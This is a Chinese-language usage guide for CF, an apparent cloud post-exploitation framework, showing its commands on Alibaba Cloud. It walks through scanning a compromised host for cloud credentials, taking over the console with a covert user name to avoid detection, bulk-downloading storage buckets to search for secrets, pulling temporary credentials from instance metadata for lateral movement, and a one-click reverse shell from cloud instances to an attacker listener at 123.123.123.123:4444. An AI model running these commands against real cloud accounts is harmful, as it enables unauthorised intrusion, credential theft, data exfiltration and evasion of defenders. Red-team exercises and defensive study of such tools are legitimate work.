---
title: CF 最佳实践
---
<center><h1>CF 云环境利用框架最佳实践</h1></center>

---

::: warning 注意

该文章适用于 CF v0.4.5 版本，该文中的命令在新版本中可能会有些变动，请以使用手册里的命令为准。

:::

考虑到在 CF 中有些功能可能知道的人不多，这里写篇文章介绍一下。

CF 是一个云环境利用工具，当获得 AccessKey 即云服务的访问凭证后，就可以使用 CF 进行 AK 的后利用，CF 项目地址：[github.com/teamssix/cf](https://github.com/teamssix/cf)

本文介绍的功能基于 0.4.5 版本，以下介绍统一以阿里云为例，关于其他的云是否适配相关命令需要以 CF 使用手册为准，CF 使用手册地址：[wiki.teamssix.com/cf](https://wiki.teamssix.com/cf)

### 配置功能

CF 中集成了扫描本地凭证的功能，使用这个功能可以快速收集本机上存储的云访问凭证，当拿下主机权限的时候，可以使用这个功能快速收集当前主机上的云凭证信息。

```bash
cf config scan
```

另外在 CF 中使用 cf config 命令配置完凭证后，如果想查看已配置的凭证，直接加上 ls 即可

```bash
cf config ls
```

如果凭证太长没有展示全，可以加上 -a 参数，查看完整的凭证内容

```bash
cf config ls -a
```

至于删除凭证加上 del 即可

```bash
cf config del
```

如果凭证中有个参数配置错了，可以加上 mf 去修改凭证中某一项的内容

```bash
cf config mf
```

若在同一个云下配置了多个凭证，想切换凭证那直接加上 sw 即可

```bash
cf config sw
```

### 接管控制台功能

接管控制台应该是 CF 使用最高频的一个功能了，当接管阿里云控制台的时候，直接使用 cf alibaba console 命令即可，这样会自动创建一个名为 crossfire 的用户，所以当蓝队发现自己的云平台用户中有一个叫 crossfire 的用户，那么可以大概率说明自己的云已经被人搞了。

对于红队而言，如果不想那么明显，可以使用 -u 指定用户名，这样也许不会被有经验的一眼看出来

```bash
cf alibaba console -u test
```

另外，这个自定义的用户名不能和平台上已有的用户名冲突，不然会接管失败

在接管后，如果想查看之前接管的信息，直接加上 ls 即可

```bash
cf alibaba console ls
```

在接管控制台之后，如果整个利用过程已经结束、项目也已经结束的时候，建议取消接管，使用 cancel 命令即可

```bash
cf alibaba console cancel
```

### 对象存储功能

有时碰到有的 AK 权限做的比较严格，必须要指定 Bucket Name 才能列出 Buckets 里的信息，这时可以使用 -b 参数指定 Bucket Name

```bash
cf alibaba oss ls -b bucket_name
```

CF 除了查看 Buckets 整体统计信息外，也可以列出 Objects 的信息，在控制台中默认会列出前一百条 Objects 信息，同时会把完整的结果导出在 result 文件夹中，因此想查看完整的结果可以直接打开 result 中的表格文件，比在控制台上看更方便

```bash
cf alibaba oss obj ls
```

CF 也可以直接下载 Buckets 里的所有文件，方便自己手工在本地去翻敏感信息，顺便提一句，从平时打攻防和身边朋友反馈来看，Buckets 里能翻出敏感信息的概率还是蛮大的，这个就是一个细活儿了，需要耐下心来，慢慢的翻

```bash
cf alibaba oss obj get
```

有时候做攻防到最后，就是看谁更细心、更有耐心，这时考验的就是一个人的品质而不是技术了。如果只是想着拿下权限就行了，接管了 Buckets 就行了，那最后的分数或许就没有其他更有耐心、更细心的队伍高。

### 弹性实例功能

在 CF 中内置了阿里云的一些私有区域，默认情况下是不调用的，如果想遍历所有的区域来搜索 ECS，可以加上 -a 参数，兴许会有意外的惊喜

```bash
cf alibaba ecs ls -a
```

CF 在 Windows 实例中执行命令的时候，默认会以 bat 脚本执行命令，如果想以 ps 脚本执行命令，可以加上 -s ps 参数

```bash
cf alibaba ecs exec -c \$PSVersionTable -s ps
```

如果想执行多行命令，使用 -f 指定一个文本文件，在文件中写入自己想执行的命令即可

```bash
cf alibaba ecs exec -f teamssix.txt
```

在发现当前凭证下有多台实例，需要证明拥有这些实例权限的时候，可以使用 -b 命令，批量为这些实例执行三要素，从而证明权限，方便报告的编写，让裁判无话可说

```bash
cf alibaba ecs exec -b
```

有的实例也许可以在元数据中获取到临时凭证，如果我们能获取到这个临时凭证信息，兴许可以进行下一步的内网横行，但一个个的在实例中去构造、访问元数据地址太过麻烦，现在只要使用 -m 参数，就可以一键发现这些实例的元数据中有没有临时凭证

```bash
cf alibaba ecs exec -m
```

只是使用 CF 去执行命令也许会觉着不太过瘾，因此在 CF 中集成了一键反弹 Shell 的功能，只需要在自己的服务器上开启 NC 监听，然后让 CF 去反弹 Shell 就行了

```bash
cf alibaba ecs exec --lhost 123.123.123.123 --lport 4444
```

### 其他

CF 在运行前，如果距离上一次运行超过 24 小时就会检查一下有无更新，在有新版本的时候，可以使用 upgrade 命令直接更新，无需再到 GitHub 中下载

```bash
cf upgrade
```

当对 CF 中某个命令不熟悉的时候，可以直接使用 help 命令查看帮助，CF 在所有的帮助信息中，都提供了中英双语展示，是不是很贴心，还没给 CF  Star 的师傅看到这里，还不给个 Star 嘛

```bash
cf help alibaba ecs exec
```

最后，在 CF 中，我还放置了些彩蛋，应该不难找，哈哈 ～


<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2023 年 6 月 4 日"
    }
  }
</script>
